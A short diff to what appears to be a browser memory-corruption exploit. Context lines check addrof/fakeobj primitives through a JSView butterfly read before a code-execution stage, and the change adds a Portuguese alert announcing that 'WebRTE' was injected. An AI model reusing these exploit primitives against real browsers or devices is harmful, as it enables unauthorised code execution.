@@ -121,6 +121,8 @@ function setupRW() {
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
 	debug_log("[+] Succesfully got addrof/fakeobj");
+	alert("\n \n P R O N T O ! WebRTE injetado com SUCESSO.\n \n A T E N Ç Ã O ! ! ! Aguarde a(s) mensagen(s).\n  Depois clique em \"OK\" e novamente em \"OK\" na próxima tela (memória insuficiente).");
+
 
 	/* Getting code execution */
 	/* ... */
